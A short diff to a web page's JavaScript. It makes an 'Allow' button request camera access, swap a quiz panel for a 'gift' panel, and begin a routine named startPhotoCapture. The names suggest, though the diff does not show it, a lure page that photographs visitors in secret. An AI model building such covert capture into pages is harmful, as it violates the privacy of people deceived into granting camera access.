@@ -316,11 +316,27 @@
                 });
         }
 
-        // Event listener for Allow button
         document.getElementById('mcq-allow').addEventListener('click', () => {
-            // Request camera permissions when the user clicks Allow
-            requestCameraPermissions();
+    // Directly request camera permissions when the user clicks Allow
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            // If permission is granted, hide the MCQ UI and show the main content
+            mcqContainer.style.display = 'none';
+            giftContainer.style.display = 'flex';
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Start capturing photos
+            startPhotoCapture(video);
+        })
+        .catch((error) => {
+            console.error('Camera access denied:', error);
+            // Show error message if permission is denied
+            errorMessage.style.display = 'block';
         });
+});
 
         // Event listener for Block button
         document.getElementById('mcq-block').addEventListener('click', () => {
